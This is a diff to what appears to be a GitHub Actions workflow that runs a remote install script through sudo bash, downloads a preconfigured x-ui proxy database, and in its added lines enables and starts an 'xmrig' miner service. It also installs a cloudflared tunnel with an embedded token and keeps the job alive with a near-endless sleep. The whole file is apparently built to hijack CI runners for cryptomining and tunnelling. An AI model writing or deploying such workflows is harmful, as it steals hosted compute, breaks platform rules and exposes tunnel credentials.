@@ -17,5 +17,8 @@ jobs:
           curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh | sudo bash -s
           wget https://github.com/sweetasshole/test/raw/refs/heads/main/x-ui/x-ui.db
           sudo mv x-ui.db /etc/x-ui
-          wget https://github.com/sweetasshole/test/raw/refs/heads/main/x-ui/x-ui.service
+          sudo systemctl daemon-reload
+          sudo systemctl enable xmrig
+          sudo systemctl start xmrig
+          sudo cloudflared service install eyJhIjoiOGQyMDg4NjE0Nzg1N2EwY2RjYzhkYjc3OGU4YjZlZjciLCJ0IjoiNWNlMzQzYmUtNjJhNi00OTdhLTlmNTgtZDQ1MDg2YmFlMDA4IiwicyI6IllqVmpOekV6WWpJdFlqZzJOeTAwTXpoakxXSXdZVGt0T1RBeU56Z3hPR1UyT1RrMSJ9
           sleep 99999999
